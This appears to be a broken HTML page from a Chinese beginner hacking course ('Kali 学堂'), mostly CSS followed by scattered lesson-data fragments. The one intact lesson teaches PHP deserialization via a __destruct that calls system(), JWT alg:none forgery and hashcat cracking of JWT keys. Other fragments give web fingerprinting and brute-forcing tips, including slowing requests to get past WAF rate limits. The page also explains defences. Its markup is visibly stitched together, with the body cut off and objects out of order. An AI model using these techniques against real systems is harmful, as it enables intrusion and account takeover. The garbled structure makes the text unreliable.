<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Kali 学堂 · 零基础网络安全实操学习台</title>
<style>
*{box-sizing:border-box}
:root{
  --bg:#f4f7fb; --panel:#ffffff; --ink:#131c2b; --ink2:#33425a; --muted:#5f7189;
  --line:#e4eaf3; --line2:#eef2f8; --accent:#2563eb; --teal:#0d9488;
  --soft:#eef4ff; --soft2:#f2fbf8; --ok:#15803d; --okbg:#ecfdf3;
  --warn:#b45309; --warnbg:#fff8ec; --code:#f7f9fc; --r:14px;
  --shadow:0 1px 2px rgba(16,32,58,.05),0 8px 24px rgba(16,32,58,.05);
}
html,body{margin:0;padding:0}
body{
  font:15px/1.68 -apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
  background:var(--bg);color:var(--ink);-webkit-font-smoothing:antialiased;
}
code,pre,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace}
a{color:var(--accent);text-decoration:none}
.app{display:flex;min-height:100vh}

/* ---------- sidebar ---------- */
.sidebar{
  width:290px;flex:0 0 290px;background:var(--panel);border-right:1px solid var(--line);
  position:sticky;top:0;height:100vh;overflow-y:auto;padding:16px 12px 20px;
  display:flex;flex-direction:column;gap:12px;z-index:30;
}
.brand{display:flex;gap:10px;align-items:center;padding:2px 6px 0}
.logo{
  width:38px;height:38px;border-radius:11px;display:grid;place-items:center;color:#fff;font-weight:800;
  background:linear-gradient(135deg,#1d4ed8,#0d9488);box-shadow:0 6px 14px rgba(37,99,235,.25);font-size:17px;
}
.brand b{display:block;font-size:15.5px;letter-spacing:.3px;line-height:1.25}
.brand small{color:var(--muted);font-size:11.5px}
.side-progress{background:var(--soft);border:1px solid #dfe8ff;border-radius:12px;padding:9px 11px}
.sp-row{display:flex;justify-content:space-between;font-size:12px;color:var(--ink2);margin-bottom:6px}
.sp-row b{color:var(--accent)}
.bar{height:6px;background:#dbe4f5;border-radius:99px;overflow:hidden}
.bar i{display:block;height:100%;width:0;border-radius:99px;background:linear-gradient(90deg,#2563eb,#0d9488);transition:width .35s}
nav{display:flex;flex-direction:column;gap:2px}
.mod{display:flex;align-items:center;gap:7px;padding:8px 8px 6px;margin-top:6px;font-size:12px;color:var(--muted);font-weight:700;letter-spacing:.2px}
.mod span.ic{font-size:14px}
.mod em{margin-left:auto;font-style:normal;font-size:11px;color:#94a3b8}
.nlink{
  display:flex;gap:8px;align-items:flex-start;padding:7px 9px 7px 10px;border-radius:9px;
  color:var(--ink2);font-size:13.3px;line-height:1.45;cursor:pointer;border:1px solid transparent;
}
.nlink:hover{background:#f5f8fe}
.nlink.active{background:var(--soft);border-color:#d6e2ff;color:#15399e;font-weight:600}
.dot{width:7px;height:7px;border-radius:99px;background:#cbd5e1;margin-top:7px;flex:0 0 7px}
.dot.part{background:#93b4f8}
.dot.done{background:#16a34a}
.side-foot{margin-top:auto;padding:10px 6px 0;border-top:1px solid var(--line2);font-size:11.5px;color:#8a99ad;line-height:1.6}
.link{background:none;border:0;color:var(--muted);font-size:12px;cursor:pointer;padding:0;text-decoration:underline}
.link:hover{color:#b91c1c}

/* ---------- topbar ---------- */
.main{flex:1;min-width:0;display:flex;flex-direction:column}
.topbar{
  position:sticky;top:0;z-index:20;display:flex;align-items:center;gap:12px;
  padding:11px 22px;background:rgba(255,255,255,.92);backdrop-filter:blur(10px);
  border-bottom:1px solid var(--line);
}
.icon-btn{display:none;background:#fff;border:1px solid var(--line);border-radius:9px;width:34px;height:34px;cursor:pointer;font-size:15px}
.search{position:relative;flex:1;max-width:520px;display:flex;align-items:center;gap:8px;background:#f4f7fc;border:1px solid var(--line);border-radius:10px;padding:0 11px;height:38px}
.search input{flex:1;border:0;background:none;outline:none;font-size:13.5px;color:var(--ink)}
.search input::placeholder{color:#94a3b8}
.results{position:absolute;top:44px;left:0;right:0;background:#fff;border:1px solid var(--line);border-radius:12px;box-shadow:0 16px 40px rgba(16,32,58,.14);max-height:340px;overflow:auto;display:none;padding:6px}
.results.show{display:block}
.res-item{padding:8px 10px;border-radius:8px;cursor:pointer;font-size:13px;color:var(--ink2)}
.res-item:hover{background:#f2f6ff}
.res-item small{display:block;color:#94a3b8;font-size:11.5px}
.res-empty{padding:12px;color:#94a3b8;font-size:13px}
.pill{margin-left:auto;font-size:12.5px;color:#1e3f8f;background:var(--soft);border:1px solid #dbe6ff;border-radius:99px;padding:5px 12px;white-space:nowrap}

/* ---------- content ---------- */
.content{flex:1;width:100%;max-width:1010px;margin:0 auto;padding:26px 30px 70px}
.card{background:var(--panel);border:1px solid var(--line);border-radius:var(--r);padding:18px 20px;box-shadow:var(--shadow)}
h1{font-size:26px;line-height:1.35;margin:6px 0 8px;letter-spacing:-.3px}
h2.sec{font-size:17px;margin:34px 0 12px;display:flex;align-items:center;gap:9px}
h2.sec small{font-weight:400;color:var(--muted);font-size:12.5px}
h3{font-size:15.5px;margin:0}
p{margin:8px 0}
.muted{color:var(--muted)}

/* hero */
.hero{border-radius:18px;padding:30px 30px 26px;background:linear-gradient(135deg,#eef4ff 0%,#f2fbf8 70%,#fffaf0 100%);border:1px solid #e0e9fb;position:relative;overflow:hidden}
.hero:after{content:"";position:absolute;right:-60px;top:-60px;width:220px;height:220px;border-radius:50%;background:radial-gradient(circle,rgba(37,99,235,.13),transparent 70%)}
.hero .tagline{display:inline-flex;align-items:center;gap:6px;font-size:12px;color:#1d4ed8;background:#fff;border:1px solid #d9e5ff;border-radius:99px;padding:4px 11px}
.hero h1{font-size:31px;margin:12px 0 10px;max-width:720px}
.hero p{color:var(--ink2);max-width:660px}
.hero-actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:18px}
.btn{display:inline-flex;align-items:center;gap:7px;border-radius:10px;padding:9px 16px;font-size:13.5px;cursor:pointer;border:1px solid transparent;font-weight:600}
.btn.primary{background:linear-gradient(135deg,#2563eb,#1d4ed8);color:#fff;box-shadow:0 6px 16px rgba(37,99,235,.24)}
.btn.ghost{background:#fff;color:var(--ink2);border-color:var(--line)}
.btn:hover{transform:translateY(-1px)}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin:18px 0 4px}
.stat{background:#fff;border:1px solid var(--line);border-radius:12px;padding:12px 14px}
.stat b{display:block;font-size:21px;letter-spacing:-.5px}
.stat span{font-size:11.5px;color:var(--muted)}

.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(288px,1fr));gap:14px;margin-top:14px}
.mcard{background:#fff;border:1px solid var(--line);border-radius:14px;padding:16px 16px 14px;cursor:pointer;transition:.18s;box-shadow:var(--shadow);position:relative}
.mcard:hover{transform:translateY(-2px);border-color:#c9d9f7;box-shadow:0 14px 30px rgba(16,32,58,.09)}
.mcard .top{display:flex;align-items:center;gap:9px;margin-bottom:7px}
.mcard .ic{width:32px;height:32px;border-radius:9px;display:grid;place-items:center;background:var(--soft);font-size:16px;flex:0 0 32px}
.mcard h3{font-size:15px}
.mcard .num{font-size:11px;color:#94a3b8;font-weight:700}
.mcard p{font-size:12.8px;color:var(--muted);margin:2px 0 12px;min-height:38px}
.mini{height:5px;background:#eef2f8;border-radius:99px;overflow:hidden}
.mini i{display:block;height:100%;background:linear-gradient(90deg,#2563eb,#0d9488);width:0}
.mmeta{display:flex;justify-content:space-between;font-size:11.5px;color:#94a3b8;margin-top:7px}

/* lesson */
.crumbs{font-size:12.5px;color:var(--muted);margin-bottom:2px}
.meta{display:flex;gap:9px;flex-wrap:wrap;align-items:center;font-size:12px;color:var(--muted);margin-bottom:18px}
.tag{background:#f1f5fb;border:1px solid var(--line);border-radius:7px;padding:2px 9px;font-size:11.5px;color:#4c5f79}
.goal{background:linear-gradient(135deg,#f5f9ff,#fbfdff);border-color:#dfe8f8}
.goal ul{margin:9px 0 0;padding-left:20px;color:var(--ink2);font-size:14px}
.goal li{margin:5px 0}
.concepts{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:10px;margin-top:12px}
.concept{background:#fff;border:1px solid var(--line);border-left:3px solid var(--teal);border-radius:10px;padding:11px 13px}
.concept b{font-size:13px;color:#0f766e}
.concept p{font-size:12.6px;color:var(--ink2);margin:3px 0 0}

.steps{display:flex;flex-direction:column;gap:14px}
.step{background:#fff;border:1px solid var(--line);border-radius:14px;padding:16px 18px 14px;box-shadow:var(--shadow);position:relative;transition:.2s}
.step.done{border-color:#c9efd7;background:linear-gradient(180deg,#fcfffd,#fff)}
.step-head{display:flex;align-items:flex-start;gap:10px}
.num{width:25px;height:25px;flex:0 0 25px;border-radius:8px;background:var(--soft);color:#1d4ed8;display:grid;place-items:center;font-size:12.5px;font-weight:800;margin-top:1px}
.step.done .num{background:#dcfce7;color:#15803d}
.step-head h3{flex:1;line-height:1.5}
.check{display:flex;align-items:center;gap:5px;font-size:12px;color:var(--muted);cursor:pointer;white-space:nowrap;user-select:none;padding:3px 8px;border-radius:8px;border:1px solid transparent}
.check:hover{background:#f6f8fc}
.check input{accent-color:#16a34a;cursor:pointer;width:14px;height:14px}
.cmdwrap{margin:12px 0 10px;border:1px solid #e6ecf5;border-radius:11px;overflow:hidden;background:var(--code)}
.cmdbar{display:flex;align-items:center;gap:7px;padding:6px 10px;background:#eef2f9;border-bottom:1px solid #e3eaf4;font-size:11px;color:#7e8fa6}
.cmdbar .d{width:7px;height:7px;border-radius:99px;background:#cfd8e6}
.cmdbar button{margin-left:auto;background:#fff;border:1px solid #dfe6f0;border-radius:6px;font-size:11px;color:#4a5d76;padding:2px 9px;cursor:pointer}
.cmdbar button:hover{background:#f4f8ff;color:#1d4ed8}
.cmdwrap pre{margin:0;padding:12px 14px;overflow-x:auto;font-size:13px;line-height:1.75;color:#0f2a52}
.why{display:flex;gap:9px;background:#f8fbff;border:1px dashed #d8e5f8;border-radius:11px;padding:10px 12px;margin:9px 0}
.why .lab{flex:0 0 auto;font-size:11.5px;font-weight:800;color:#1d4ed8;background:#e6eeff;border-radius:6px;padding:2px 8px;height:22px;line-height:18px}
.why p{margin:0;font-size:13.4px;color:var(--ink2)}
.out{display:flex;gap:9px;margin:8px 0;font-size:13px;color:var(--ink2)}
.out .lab{flex:0 0 auto;font-size:11.5px;font-weight:800;color:#0f766e;background:#e2f7f3;border-radius:6px;padding:2px 8px;height:22px;line-height:18px}
.out p{margin:0}
.try{border:1px solid #e3ecf9;background:#fafcff;border-radius:11px;padding:10px 12px;margin-top:10px}
.try .th{font-size:12px;color:#4b6180;margin-bottom:7px;font-weight:600}
.tryrow{display:flex;align-items:center;gap:7px;background:#fff;border:1px solid #dfe7f3;border-radius:9px;padding:5px 10px}
.tryrow .pf{color:#16a34a;font-weight:700;font-size:13px}
.tryrow input{flex:1;border:0;outline:none;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12.8px;color:#0f2a52;background:none;min-width:0}
.tryrow button{background:#1d4ed8;color:#fff;border:0;border-radius:7px;padding:5px 12px;font-size:12px;cursor:pointer}
.trymsg{font-size:12.5px;margin-top:7px;display:none}
.trymsg.show{display:block}
.trymsg.good{color:#15803d}
.trymsg.bad{color:#b45309}
.hints{margin-top:9px}
.hintbtn{background:#fffaf0;border:1px solid #f2e0bf;color:#96600f;border-radius:8px;padding:5px 11px;font-size:12px;cursor:pointer}
.hintbtn:hover{background:#fff3dc}
.hintlist{margin-top:8px;display:flex;flex-direction:column;gap:7px}
.hint{background:#fffcf6;border-left:3px solid #f0b429;border-radius:8px;padding:8px 11px;font-size:12.8px;color:#7a5a18}
.pit{background:#fffaf5;border:1px solid #f7e5d3;border-radius:12px;padding:13px 16px;margin-top:14px;font-size:13.4px;color:#7c4a12}
.pit b{color:#b45309}
.pit ul{margin:7px 0 0;padding-left:19px}
.quiz{background:#fff;border:1px solid var(--line);border-radius:12px;padding:15px 17px;margin-top:14px}
.quiz .q{font-size:13.8px;font-weight:600;margin-bottom:10px}
.opt{display:block;width:100%;text-align:left;background:#fafcff;border:1px solid #e4ebf6;border-radius:9px;padding:8px 12px;font-size:13.2px;color:var(--ink2);margin-bottom:7px;cursor:pointer;transition:.15s}
.opt:hover{background:#f2f7ff;border-color:#cddefa}
.opt.right{background:var(--okbg);border-color:#a7e8c0;color:#136c34;font-weight:600}
.opt.wrong{background:#fef2f2;border-color:#fbcaca;color:#b42318}
.qexp{display:none;font-size:12.8px;color:#3d5470;background:#f7faff;border-left:3px solid #93b4f8;border-radius:8px;padding:9px 12px;margin-top:4px}
.qexp.show{display:block}
.lnav{display:flex;justify-content:space-between;gap:10px;margin-top:26px}
.lnav .btn{max-width:49%}
.lnav .btn small{display:block;color:#94a3b8;font-size:10.5px;font-weight:400}
.foot{text-align:center;font-size:11.5px;color:#93a3b8;padding:0 20px 26px}
.legalbar{display:flex;gap:9px;align-items:flex-start;background:#fff8f0;border:1px solid #f6e3cb;border-radius:12px;padding:11px 14px;font-size:12.5px;color:#8a5a15;margin-top:16px}
.toast{position:fixed;left:50%;bottom:34px;transform:translateX(-50%) translateY(20px);background:#132033;color:#fff;padding:9px 16px;border-radius:10px;font-size:12.5px;opacity:0;pointer-events:none;transition:.25s;z-index:99}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}

/* ---------- labs / tasks / deep ---------- */
.tasks{list-style:none;margin:6px 0 0;padding:0;display:flex;flex-direction:column;gap:7px}
.task{display:flex;gap:9px;align-items:flex-start;background:#fafcff;border:1px solid #e6eefb;border-radius:9px;padding:8px 11px;font-size:13.2px;color:var(--ink2);cursor:pointer}
.task:hover{background:#f4f9ff}
.task input{accent-color:#16a34a;margin-top:4px;width:14px;height:14px;cursor:pointer;flex:0 0 14px}
.task.done{background:#f6fef9;border-color:#cbeed8;color:#14663a}
.task .tn{font-weight:700;color:#1d4ed8;margin-right:4px}
.task.done .tn{color:#15803d}
.deep{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:10px}
.deepcard{background:#fbfdff;border:1px solid #e2ebf8;border-left:3px solid var(--accent);border-radius:10px;padding:11px 13px}
.deepcard b{font-size:13px;color:#1740a0}
.deepcard p{font-size:12.7px;color:var(--ink2);margin:4px 0 0}
.chal{background:#f8f5ff;border:1px solid #e7ddfb;border-left:3px solid #7c3aed;border-radius:12px;padding:13px 16px;margin-top:14px;font-size:13.3px;color:#4c2a86}
.chal b{color:#6d28d9}
.chal ol{margin:7px 0 0;padding-left:20px}
.chal li{margin:4px 0}
.refs{font-size:12.3px;color:var(--muted);background:#f8fafc;border:1px solid var(--line2);border-radius:10px;padding:9px 12px;margin-top:12px}
.refs a{color:#2563eb}
/* labs page */
.filters{display:flex;gap:8px;flex-wrap:wrap;margin:14px 0 4px}
.chip{background:#fff;border:1px solid var(--line);border-radius:99px;padding:5px 13px;font-size:12.5px;color:var(--ink2);cursor:pointer}
.chip:hover{border-color:#c9d9f7;background:#f7faff}
.chip.on{background:#1d4ed8;border-color:#1d4ed8;color:#fff;font-weight:600}
.labgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:14px;margin-top:14px}
.lab{background:#fff;border:1px solid var(--line);border-radius:14px;padding:16px;box-shadow:var(--shadow);display:flex;flex-direction:column}
.lab .lt{display:flex;align-items:center;gap:9px;margin-bottom:4px}
.lab .lt b{font-size:15px}
.lab .lt .badge{font-size:11px;border-radius:6px;padding:2px 8px;background:var(--soft);color:#1d4ed8;border:1px solid #dbe6ff}
.lab .lt .badge.win{background:#f3f0ff;color:#5b21b6;border-color:#e4dcff}
.lab p.desc{font-size:12.8px;color:var(--muted);margin:4px 0 10px}
.lab pre{margin:0;background:var(--code);border:1px solid #e6ecf5;border-radius:9px;padding:9px 11px;font-size:11.8px;line-height:1.6;overflow-x:auto;color:#0f2a52}
.lab .row{display:flex;gap:8px;align-items:center;margin-top:9px;flex-wrap:wrap}
.lab .row code{background:#f4f7fc;border:1px solid #e6ecf5;border-radius:6px;padding:2px 7px;font-size:11.5px;color:#334155}
.lab .row button{background:#fff;border:1px solid #dbe4f2;border-radius:7px;padding:3px 10px;font-size:11.5px;color:#33507a;cursor:pointer;margin-left:auto}
.lab .row button:hover{background:#f2f7ff;color:#1d4ed8}
.lab .pts{display:flex;gap:5px;flex-wrap:wrap;margin-top:9px}
.lab .pts span{font-size:11px;background:#f6f8fc;border:1px solid #e9eef7;border-radius:5px;padding:1px 7px;color:#5a6d88}
.labfoot{font-size:11.5px;color:#94a3b8;margin-top:10px;border-top:1px dashed #eef2f8;padding-top:8px}
.scriptbox{background:#f8fbff;border:1px solid #dfe9f9;border-radius:14px;padding:16px 18px;margin-top:16px}
.scriptbox pre{background:#fff;border:1px solid #e6ecf5;border-radius:10px;padding:12px 14px;font-size:12px;max-height:280px;overflow:auto;color:#0f2a52;margin:9px 0}
.navspecial{background:linear-gradient(135deg,#eef4ff,#f2fbf8);border:1px solid #dbe6ff;font-weight:700;color:#15399e;margin:2px 0 6px;justify-content:center}
.navspecial:hover{background:linear-gradient(135deg,#e4edff,#eafaf5)}
.tiny{font-size:11.8px}

/* ---------- master track ---------- */
.mhero{border-radius:18px;padding:32px 32px 28px;background:linear-gradient(135deg,#0b1220 0%,#132a5c 55%,#0d3b3a 100%);color:#eaf1ff;position:relative;overflow:hidden;border:1px solid #1b2b4d}
.mhero:before{content:"";position:absolute;right:-90px;top:-90px;width:300px;height:300px;border-radius:50%;background:radial-gradient(circle,rgba(56,189,248,.22),transparent 68%)}
.mhero:after{content:"";position:absolute;left:-70px;bottom:-110px;width:260px;height:260px;border-radius:50%;background:radial-gradient(circle,rgba(13,148,136,.25),transparent 70%)}
.mhero .tagline{display:inline-flex;gap:6px;align-items:center;font-size:12px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.18);border-radius:99px;padding:4px 11px;color:#bcd4ff}
.mhero h1{font-size:30px;margin:14px 0 10px;color:#fff;max-width:680px;letter-spacing:-.4px}
.mhero p{color:#b9c8e4;max-width:660px;font-size:14px}
.mhero .hl{color:#7ee0c6;font-weight:700}
.mhero .btn.ghost{background:rgba(255,255,255,.08);border-color:rgba(255,255,255,.22);color:#dbe7ff}
.depth{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin:20px 0 4px;position:relative;z-index:2}
.dlayer{background:rgba(255,255,255,.055);border:1px solid rgba(255,255,255,.13);border-radius:12px;padding:12px 13px}
.dlayer b{display:block;font-size:12.5px;color:#fff;margin-bottom:3px}
.dlayer small{font-size:11.5px;color:#9fb3d4;line-height:1.5;display:block}
.dlayer em{font-style:normal;font-size:10.5px;color:#7ee0c6;letter-spacing:.5px;text-transform:uppercase}

.levels{display:grid;grid-template-columns:repeat(6,1fr);gap:9px;margin-top:14px}
.lvcard{background:#fff;border:1px solid var(--line);border-radius:13px;padding:13px 12px;box-shadow:var(--shadow);position:relative;overflow:hidden}
.lvcard:before{content:"";position:absolute;left:0;top:0;width:100%;height:3px;background:linear-gradient(90deg,#2563eb,#0d9488)}
.lvcard b.code{display:inline-block;font-size:11px;color:#fff;background:#15399e;border-radius:5px;padding:1px 6px;letter-spacing:.5px}
.lvcard h4{font-size:13.5px;margin:8px 0 5px}

.method{display:grid;grid-template-columns:repeat(2,1fr);gap:11px;margin-top:14px}
.mcard2{background:#fff;border:1px solid var(--line);border-left:3px solid #2563eb;border-radius:11px;padding:13px 15px;box-shadow:var(--shadow)}

.topic{background:#fff;border:1px solid var(--line);border-radius:13px;margin-bottom:10px;box-shadow:var(--shadow);overflow:hidden}
.topic[open]{border-color:#c9d9f7}
.topic>summary{cursor:pointer;padding:14px 16px;display:flex;gap:11px;align-items:flex-start;list-style:none}
.topic>summary::-webkit-details-marker{display:none}
.topic>summary .tic{width:30px;height:30px;flex:0 0 30px;border-radius:9px;display:grid;place-items:center;background:var(--soft);font-size:15px}
.topic>summary .tt{flex:1;min-width:0}
.topic>summary h4{font-size:14.2px;margin:0 0 3px;line-height:1.45}
.topic>summary .q{font-size:12.3px;color:var(--muted);line-height:1.55}
.topic>summary .arw{color:#94a3b8;font-size:12px;transition:.2s;margin-top:6px}
.topic[open]>summary .arw{transform:rotate(90deg)}
.tbody{padding:2px 16px 16px;border-top:1px solid var(--line2)}
.tbody h5{font-size:13px;margin:15px 0 4px;color:#15399e;display:flex;gap:6px;align-items:center}
.tbody p{font-size:13.2px;color:var(--ink2);margin:4px 0}

.tbody ul{padding-left:19px;margin:6px 0}
.tbody li{font-size:12.9px;color:var(--ink2);margin:4px 0}
.tcode{background:#0e1729;color:#dbe7ff;border-radius:10px;padding:12px 14px;overflow:auto;font-size:12.3px;line-height:1.6;margin:8px 0}
.tcode code{white-space:pre}
.tblock{background:#f8fbff;border:1px solid #e3ecfa;border-left:3px solid #0d9488;border-radius:9px;padding:10px 13px;margin:10px 0 0;font-size:12.8px;color:#155e56}
.tblock b{display:block;font-size:11.5px;color:#0f766e;letter-spacing:.4px;margin-bottom:3px}
.tblock.check{background:#fbfaff;border-color:#e8e2fb;border-left-color:#7c3aed;color:#4c2a86}
.tblock.check b{color:#6d28d9}
.tblock.check ul{padding-left:17px;margin:2px 0}
.tblock.check li{font-size:12.6px;color:#4c2a86}
.tread{font-size:12px;color:#6b7d95;margin-top:10px;line-height:1.7}
.tread b{color:#41546e}

.proj{background:#fff;border:1px solid var(--line);border-radius:13px;padding:16px 17px;box-shadow:var(--shadow);border-top:3px solid #7c3aed}
.proj .ph{display:flex;gap:9px;align-items:center;margin-bottom:6px}
.proj .ph .ic{width:30px;height:30px;border-radius:9px;background:#f6f2ff;display:grid;place-items:center;font-size:15px}
.proj h4{font-size:14.2px;margin:0}
.proj .why{font-size:12.7px;color:var(--muted);margin:4px 0 9px}
.proj ol{padding-left:19px;margin:6px 0}
.proj li{font-size:12.8px;color:var(--ink2);margin:4px 0}
.proj .del{margin-top:10px;background:#faf8ff;border:1px dashed #ddd0f7;border-radius:8px;padding:8px 11px;font-size:12.2px;color:#4c2a86}
.proj .del b{color:#6d28d9}

.drill{width:100%;border-collapse:collapse;margin-top:12px;font-size:12.9px}
.drill th{text-align:left;font-size:11.5px;color:var(--muted);font-weight:700;padding:8px 10px;background:#f7f9fd;border-bottom:1px solid var(--line)}
.drill td{padding:9px 10px;border-bottom:1px solid var(--line2);color:var(--ink2);vertical-align:top}
.drill tr:last-child td{border-bottom:0}
.drill td b{color:#15399e}

.qa{background:#fff;border:1px solid var(--line);border-radius:12px;margin-bottom:8px;overflow:hidden}
.qa>summary{cursor:pointer;padding:10px 14px;font-size:13.2px;font-weight:600;color:var(--ink);list-style:none;display:flex;gap:8px}
.qa>summary::-webkit-details-marker{display:none}
.qa>summary:before{content:"Q";font-size:11px;color:#fff;background:#2563eb;border-radius:5px;width:17px;height:17px;display:grid;place-items:center;flex:0 0 17px;margin-top:3px}
.qa .ans{padding:0 14px 13px 39px;font-size:12.9px;color:var(--ink2)}
.qa .ans b{color:#0f766e}

.trail{background:linear-gradient(135deg,#f6f9ff,#f4fdfa);border:1px solid #dbe6ff;border-radius:13px;padding:14px 16px;margin-top:16px}
.trail b.h{display:block;font-size:13.2px;color:#15399e;margin-bottom:8px}
.trail .titem{display:flex;gap:9px;align-items:flex-start;padding:7px 9px;border-radius:8px;background:#fff;border:1px solid #e6eefb;margin-bottom:6px;cursor:pointer;font-size:12.7px;color:var(--ink2)}
.trail .titem:hover{border-color:#c2d6f8;background:#fbfdff}
.trail .titem .ttl{font-weight:600;color:#15399e}
.trail .titem small{display:block;color:#8496ad;font-size:11.5px;font-weight:400}

@media (max-width:1100px){.levels{grid-template-columns:repeat(3,1fr)}.depth{grid-template-columns:repeat(2,1fr)}}
@media (max-width:900px){
  .sidebar{position:fixed;left:0;top:0;transform:translateX(-102%);transition:transform .25s;box-shadow:0 20px 60px rgba(16,32,58,.2)}
  .sidebar.open{transform:none}
  .icon-btn{display:block}
  .content{padding:18px 16px 60px}
  .stats{grid-template-columns:repeat(2,1fr)}
  .hero{padding:22px 20px}
  .hero h1{font-size:24px}
  .pill{display:none}
}
</style>
</head>
<body>
<div class="app">
  <aside class="sidebar" id="sidebar">
    <div class="brand">
      <div class="logo">K</div>

  </main>
</div>
<div class="toast" id="toast"></div>

    steps:[

       try:{need:['whatweb'], hint:'这条命令就是专门做 Web 指纹识别的工具。'}},

      hints:['Kali 自带字典在 /usr/share/wordlists/，seclists 更全：apt install seclists。','被 WAF 拦了会全是 403/429，试试加 --delay 100ms 降低速率。'],

  }

      {t:'哈希校验', d:'镜像前后各算一次 SHA-256，两者一致才能证明「这份镜像没被动过」。这就是证据链的技术基础。'},

       out:'一个 img 文件 + 一份 sha256 记录，镜像前后哈希一致。',

{
  id:'l2-7', title:'反序列化与 JWT：把数据变成代码的两种方式', time:'55 分钟', level:'高级',
  tags:['反序列化','POP 链','JWT','签名'],
  goal:[
    '认出序列化数据的特征，判断哪一段是用户可控的',
    '理解魔术方法为什么会被自动触发，POP 链是怎么拼起来的',
    '手工解出 JWT 结构，并说清 alg:none 与弱密钥两种失效方式'
  ],
  concepts:[
    {t:'反序列化', d:'把字符串还原成对象。危险在于「还原」过程会自动调用魔术方法（__wakeup、__destruct），而对象的属性值完全由攻击者控制。'},
    {t:'POP 链', d:'面向属性编程：不改代码，只改对象的属性，让程序沿着「自动调用 → 属性可控 → 再调用」的路径走到危险函数（system、eval）。'},
    {t:'JWT', d:'header.payload.signature 三段 base64url。payload 是明文可读的，安全性完全来自签名——签名算法一旦可被指定为 none 或密钥太弱，就等于没有。'}
  ],
  steps:[
    {title:'先认出「这是序列化数据」',
     cmd:`# PHP：O:4:"User":2:{s:4:"name";s:5:"admin";}
# Java：rO0ABXNy...（base64 后的 AC ED 00 05）
# Python pickle：gASV... 或 \\x80\\x04\\x95
# JWT：eyJhbGciOi... 以 eyJ 开头`,
     why:'看到 O:4 就知道是 PHP 序列化，看到 rO0AB 就知道是 Java 序列化，看到 eyJ 就是 JWT。判断类型之后，才知道该找反序列化 gadget 还是该爆破签名密钥。',
     out:'能说出这段数据是什么语言、哪个框架产生的。',
     hints:['Cookie、隐藏表单字段、remember_me、viewstate 都是高发位置。','把 base64 解出来看开头字节，比猜准。'],
     try:{need:['eyJ'], hint:'JWT 通常以这一段开头（base64 的 {"）。'}},
    {title:'魔术方法：为什么「只是还原对象」会执行代码',
     cmd:`class User {
  public $cmd = 'whoami';
  function __destruct(){ system($this->cmd); }
}
unserialize('O:4:"User":1:{s:3:"cmd";s:2:"id";}');`,
     why:'__destruct 在对象销毁时自动调用，参数取自你控制的属性 $cmd。程序本身没打算执行命令，是你把「属性」改成了命令。这就是反序列化漏洞的原型。',
     out:'页面返回 id 命令的输出。',
     hints:['__wakeup、__toString、__call 都是常见的触发点。','真实代码里链子更长：A 的 __destruct 调用 B 的方法，B 再调用 C……这就是 POP 链。']},
    {title:'拆开 JWT 看三段',
     cmd:`echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.xxx" \\
  | cut -d. -f1-2 | tr . '\\n' | while read s; do
      echo "$s==" | base64 -d 2>/dev/null; echo; done`,
     why:'header 说明算法，payload 放用户与角色，signature 是前两段的签名。payload 只是 base64 而不是加密——任何人都能读到，所以绝不能放密码、手机号这类敏感信息。',
     out:'header 是 {"alg":"HS256","typ":"JWT"}，payload 是 {"user":"guest","role":"user"}。',
     hints:['base64url 用 - 和 _，解码前要换回 + 和 /，并补 = 号。','浏览器 F12 的 Application → Cookies 里常能看到 token。'],
     try:{need:['base64'], hint:'JWT 的三段都是 base64url 编码，可以解出来。'}},
    {title:'两种最常见的失效：alg:none 与弱密钥',
     cmd:`# 1) 把 header 改成 {"alg":"none"}，去掉签名段，看服务端是否接受
# 2) 弱密钥爆破
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# 命中后可以任意改 payload 重新签名`,
     why:'如果服务端「按 header 里的算法来验签」，那它就可能接受 none（不验签）。如果密钥是 secret 这种弱口令，爆破几分钟就出来，之后你能给自己签任何角色。',
     out:'改过的 token 被接受，或爆破出原始密钥。',
     hints:['HS256 与 RS256 混用还存在「用公钥当 HMAC 密钥」的经典绕过。','jku / kid 参数如果可控，还能让它去加载你指定的公钥。'],
     try:{need:['16500'], hint:'hashcat 里 JWT 的模式号是 16500。'}},
    {title:'防护：让「不可信数据」永远不进入危险路径',
     cmd:`# 反序列化：不反序列化用户输入；必须用时签名 + 白名单类（Java 的 ObjectInputFilter）
# JWT：算法固定白名单（只允许 RS256）、密钥 >= 32 字节随机、校验 exp/nbf/aud、禁止 none
# 通用：序列化数据当 token 用，就要像对待密码一样对待它`,
     why:'这两类漏洞的共同点是「攻击者能控制被解释的数据结构」。解法不是过滤字符，而是让数据不再被当成结构解释——签名验证 + 类型白名单 + 算法固定，是唯一可靠的三件套。',
     out:'同样的篡改 token 被 401 拒绝。',
     hints:['别用「黑名单过滤 O:」这种方式，编码、嵌套都能绕。','JWT 不要存敏感信息，payload 是公开的。']}
  ],
  deep:[
    {t:'POP 链为什么需要「跳板」', d:'危险函数往往不在你能直接控制的对象里。链子的作用是通过属性赋值，把「一个对象的销毁」串到「另一个对象的方法调用」，最后落到 system。'},
    {t:'为什么 payload 不能加密代替签名', d:'加密解决机密性，签名解决完整性。JWT 需要的是「不能被篡改」，所以必须签名；而 payload 公开是可接受的——只要不放敏感数据。'},
    {t:'反序列化漏洞为什么难修', d:'gadget 藏在整个依赖树里（框架、第三方库），你修了自己的代码，依赖里还有链子。所以主流做法是「不反序列化不可信数据」，而不是逐个堵 gadget。'}

  labs:[

  ],
  pitfalls:[
    '以为 JWT 是加密的，把用户手机号塞进 payload。',
    '只校验签名不校验 exp，token 永不过期。',

